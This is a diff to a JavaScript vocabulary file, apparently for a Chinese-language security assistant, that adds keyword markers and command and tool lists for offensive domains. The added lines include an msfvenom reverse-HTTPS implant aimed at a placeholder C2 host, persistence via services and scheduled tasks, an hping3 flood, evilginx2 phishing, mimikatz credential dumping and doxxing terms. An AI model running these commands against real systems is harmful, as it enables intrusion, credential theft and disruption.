@@ -4,9 +4,9 @@
 // 规则与护栏在 data/vocabulary.mjs；本文件只承载数据，合并进领域包的动作在
 // data/scenarios.mjs 里完成。
 //
-// 源文件：A-offense-core.json · B-reverse-malware.json · C-network-cloud.json · D-eng-crypto-data-ai.json · E-curated-fixes.json
+// 源文件：A-offense-core.json · B-reverse-malware.json · C-network-cloud.json · D-eng-crypto-data-ai.json · E-curated-fixes.json · F-v0140-newdomains.json · G-v0140-backfill.json
 
-export const VOCAB_SOURCES = ["A-offense-core.json","B-reverse-malware.json","C-network-cloud.json","D-eng-crypto-data-ai.json","E-curated-fixes.json"];
+export const VOCAB_SOURCES = ["A-offense-core.json","B-reverse-malware.json","C-network-cloud.json","D-eng-crypto-data-ai.json","E-curated-fixes.json","F-v0140-newdomains.json","G-v0140-backfill.json"];
 
 export const ALIAS_EXTRA = {
   web: [
@@ -758,6 +758,14 @@ export const MARKER_EXTRA = {
     "文件包含",
     "sql 注入",
     "爆破",
+    "日站",
+    "拿站",
+    "撞库攻击",
+    "风控绕过",
+    "后台爆破",
+    "旁站",
+    "支付逻辑",
+    "越权访问",
   ],
   mobile: [
     "apktool",
@@ -1044,6 +1052,16 @@ export const MARKER_EXTRA = {
     "hashcat -m 1000",
     "spray",
     "mimikatz sekurlsa",
+    "黑进",
+    "黑掉",
+    "入侵",
+    "真实ip",
+    "真实 ip",
+    "cdn 回源",
+    "回源",
+    "资产测绘",
+    "扫端口",
+    "网络空间测绘",
   ],
   network_device: [
     "vxlan",
@@ -1142,6 +1160,11 @@ export const MARKER_EXTRA = {
     "dark web",
     "business relationship",
     "threat actor",
+    "人肉",
+    "邮箱反查",
+    "手机号反查",
+    "开盒",
+    "画像还原",
   ],
   crack: [
     "校验点",
@@ -1174,6 +1197,11 @@ export const MARKER_EXTRA = {
     "反调试",
     "x64dbg",
     "cyberchef",
+    "付费墙",
+    "付费功能",
+    "高级功能",
+    "授权码",
+    "离线激活",
   ],
   llm: [
     "系统提示词",
@@ -1283,6 +1311,12 @@ export const MARKER_EXTRA = {
     "爬取",
     "网页数据",
     "采集",
+    "captcha",
+    "图形验证码",
+    "打码平台",
+    "验证码识别",
+    "滑块验证",
+    "风控验证",
   ],
   deanon: [
     "写作风格",
@@ -1507,6 +1541,13 @@ export const MARKER_EXTRA = {
     "栈平衡",
     "dll注入",
     "注入 dll",
+    "浏览器cookie",
+    "浏览器 cookie",
+    "cookie 窃取",
+    "cookie窃取",
+    "session 劫持",
+    "session劫持",
+    "凭据窃取",
   ],
   malware: [
     "失陷指标",
@@ -1531,6 +1572,19 @@ export const MARKER_EXTRA = {
     "载荷投递",
     "恶意样本",
     "样本",
+    "蠕虫",
+    "worm",
+    "局域网传播",
+    "勒索软件",
+    "ransomware",
+    "键盘记录",
+    "keylog",
+    "宏病毒",
+    "宏代码",
+    "maldoc",
+    "恶意文档",
+    "恶意宏",
+    "挖矿木马",
   ],
   exploit_dev: [
     "返回导向编程",
@@ -1640,6 +1694,24 @@ export const MARKER_EXTRA = {
     "airflow",
     "n8n workflow",
     "watch -n",
+  ],
+  evasion: [
+    "反病毒软件",
+    "免杀处理",
+    "杀软绕过",
+  ],
+  privesc: [
+    "后渗透",
+    "域内提权",
+    "本地管理员",
+  ],
+  phishing: [
+    "克隆",
+    "仿冒登录",
+  ],
+  drm: [
+    "netflix",
+    "流媒体",
   ],
 };
 
@@ -2035,6 +2107,49 @@ export const COMMAND_VOCAB = {
     "gh workflow run FILE.yml && gh run watch",
     "watch -n 5 'curl -s URL | jq .status'",
   ],
+  evasion: [
+    "ThreatCheck.exe -f PAYLOAD.exe — 定位被杀软命中的字节偏移（改代码前先定位）",
+    "AMSITrigger.exe -i SCRIPT.ps1 -f 3 — 单点定位触发 AMSI 的字符串",
+    "python3 -c \"import base64;print(base64.b64encode(open('PAYLOAD.bin','rb').read()).decode())\" — 载荷编码落地",
+    "pe-sieve64.exe /pid PID — 内存里检出被 patch / 注入的模块",
+    "powershell -c \"Get-MpThreatDetection | fl ThreatName,Resources\" — 查 Defender 到底拦了什么",
+  ],
+  privesc: [
+    "whoami /priv & whoami /groups — Windows 令牌权限面",
+    "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" — 版本与补丁基线",
+    "accesschk.exe -uwcqv \"Everyone\" * /accepteula — 可写服务与权限配置",
+    "find / -perm -4000 -type f 2>/dev/null — Linux SUID 枚举",
+    "sudo -l — 可用的 sudo 路径",
+    "bash les.sh — 按内核版本列出 exploit 候选",
+  ],
+  phishing: [
+    "python3 -m http.server 8080 --directory LANDING_DIR — 起落地页（演练环境）",
+    "dig +short TXT _dmarc.DOMAIN — 演练域 DMARC 是否配好",
+    "openssl req -x509 -newkey rsa:2048 -nodes -keyout KEY.pem -out CERT.pem -days 30 -subj \"/CN=DOMAIN\" — 演练用自签名证书",
+    "swaks --to TARGET_MAIL --from SENDER --server SMTP_HOST --body BODY.txt — 单封投递测试",
+    "evilginx2 -p PHISH_DIR — 反向代理型演练落地（只收集必要字段）",
+  ],
+  rat_c2: [
+    "msfvenom -p windows/x64/meterpreter_reverse_https LHOST=C2_HOST LPORT=443 -f exe -o IMPLANT.exe — 生成受控端（授权演练）",
+    "openssl req -x509 -newkey rsa:2048 -nodes -keyout c2.key -out c2.crt -days 365 -subj \"/CN=C2_HOST\" — C2 证书",
+    "sc.exe create SVC_NAME binPath= C:\\PATH\\IMPLANT.exe start= auto — 持久化（测试机上验证后清理）",
+    "schtasks /create /tn TASK_NAME /tr IMPLANT.exe /sc onlogon /f — 计划任务持久化",
+    "Get-NetTCPConnection -RemotePort 443 | fl — 上线与连接观测",
+  ],
+  dos: [
+    "wrk -t4 -c200 -d60s --latency http://TARGET/ — L7 阶梯压测（授权窗口内）",
+    "ab -n 100000 -c 200 http://TARGET/ — 轻量应用层压测",
+    "hping3 -S --flood -p 443 TARGET — L4 连接洪泛（仅自建环境）",
+    "mtr -rwzbc 100 TARGET — 链路丢包与时延基线",
+    "ss -s && ss -lnt | wc -l — 本机连接数观测",
+  ],
+  drm: [
+    "ffprobe -v error -show_streams -show_format MANIFEST — 看媒体流与加密字段",
+    "mp4dump --verbosity 3 FILE.mp4 | grep -Ei \"pssh|tenc|senc\" — 找 CENC 加密盒",
+    "curl -sS \"LICENSE_URL\" -H \"Content-Type: application/octet-stream\" --data-binary @challenge.bin -o resp.bin — 许可证请求",
+    "openssl asn1parse -inform DER -in resp.bin — 解析许可证响应结构",
+    "ffmpeg -i INPUT.m3u8 -c copy OUTPUT.ts — 授权内容的常规转封装（合法路径）",
+  ],
 };
 
 export const TOOLCHAIN_EXTRA = {
@@ -2308,5 +2423,44 @@ export const TOOLCHAIN_EXTRA = {
     "shellcheck — Shell 脚本静态检查（shellcheck -S warning） | 装: apt install shellcheck | 验: shellcheck --version",
     "GitHub CLI — 流水线触发与跟踪（gh workflow run、gh run watch） | 装: apt install gh | 验: gh --version",
     "pre-commit — 提交前钩子与自动修（pre-commit run --all-files、pre-commit install） | 装: pipx install pre-commit | 验: pre-commit --version",
+  ],
+  evasion: [
+    "ThreatCheck — 定位被杀软命中的字节偏移 | 装: go install github.com/rasta-mouse/ThreatCheck@latest（或官方 release） | 验: ThreatCheck.exe --help",
+    "AMSITrigger — 单点定位触发 AMSI 的脚本字符串 | 装: go install github.com/RythmStick/AMSITrigger@latest（或 release 二进制） | 验: AMSITrigger.exe -h",
+    "pe-sieve / hollows_hunter — 内存中的注入与 patch 检测 | 装: 官方 release（hasherezade/pe-sieve）解压到 /opt | 验: pe-sieve64.exe /?（无 GUI，命令行即验证）",
+    "Sysmon — 行为面回放（进程/网络/DLL 加载） | 装: 下载 Sysinternals 后 Sysmon64.exe -i 配置.xml -accepteula | 验: Get-Service Sysmon64 看 Running",
+  ],
+  privesc: [
+    "WinPEAS / LinPEAS — 主机提权面自动枚举 | 装: curl -fsSL https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe -o wp.exe（Linux 取 linpeas.sh） | 验: wp.exe -h",
+    "PowerUp — Windows 配置类提权检查 | 装: 从 PowerShellMafia/PowerSploit 取 PowerUp.ps1 | 验: powershell -c \". .\\PowerUp.ps1; Invoke-AllChecks\"",
+    "Seatbelt — 主机枚举与配置弱点 | 装: 官方 release 或 dotnet build | 验: Seatbelt.exe -group=all -help",
+    "linux-exploit-suggester — 按内核版本给 exploit 候选 | 装: curl -fsSL https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -o les.sh | 验: bash les.sh --help",
+    "impacket-secretsdump / mimikatz — 凭据提取验证 | 装: pipx install impacket；mimikatz 取官方 release | 验: impacket-secretsdump -h",
+  ],
+  phishing: [
+    "Gophish — 授权演练平台（模板/投递/统计） | 装: 官方 release 解压，或 docker run -p 3333:3333 gophish/gophish | 验: 打开 http://HOST:3333 看管理台",
+    "Evilginx2 / Modlishka — 反向代理型演练落地 | 装: 官方 release 二进制放 /opt | 验: evilginx2 -h",
+    "swaks — 单封邮件投递测试与头部分析 | 装: apt install swaks（或官方 release） | 验: swaks --help",
+    "dig / openssl — 演练域 SPF/DKIM/DMARC 与证书自检 | 装: apt install dnsutils openssl | 验: dig -v && openssl version",
+    "mitmproxy — 落地页回连与请求观察 | 装: pipx install mitmproxy | 验: mitmproxy --version",
+  ],
+  rat_c2: [
+    "Sliver — 开源 C2 框架（授权演练） | 装: curl -fsSL https://sliver.sh/install | bash | 验: sliver-server --version",
+    "Metasploit Framework — 受控端生成与后渗透模块 | 装: 官方 omnibus 安装脚本 | 验: msfconsole --version",
+    "chisel / socat — 隧道与端口转发 | 装: socat 用 apt；chisel 用 go install github.com/jpillora/chisel@latest | 验: socat -V && chisel --version",
+    "Wireshark / tshark — 通道流量特征复核 | 装: apt install wireshark | 验: tshark -v",
+    "Mythic / Cobalt Strike — 团队化 C2（商用需授权） | 装: Mythic 用 docker compose up | 验: 打开 http://HOST:7443 看管理台",
+  ],
+  dos: [
+    "wrk / wrk2 — 应用层压测（wrk2 可定速率） | 装: apt install wrk；wrk2 需 cmake 编译 | 验: wrk --version",
+    "hping3 — 自定义包与连接洪泛 | 装: apt install hping3 | 验: hping3 --version",
+    "iperf3 — 纯带宽基线（分清带宽瓶颈与连接瓶颈） | 装: apt install iperf3 | 验: iperf3 --version",
+    "node_exporter + Prometheus — 加压时的指标曲线 | 装: docker run -p 9100:9100 prom/node-exporter | 验: curl -s localhost:9100/metrics | head",
+  ],
+  drm: [
+    "Bento4（mp4dump/mp4info） — 读 pssh/tenc/senc 加密盒 | 装: apt install bento4（或官方 release） | 验: mp4dump --help",
+    "ffmpeg / ffprobe — 清单与流信息解析、常规转封装 | 装: apt install ffmpeg | 验: ffmpeg -version",
+    "openssl — 许可证请求/响应与证书链路分析 | 装: apt install openssl | 验: openssl version",
+    "yt-dlp — 官方允许范围的下载对照（判定合法路径） | 装: pipx install yt-dlp | 验: yt-dlp --version",
   ],
 };
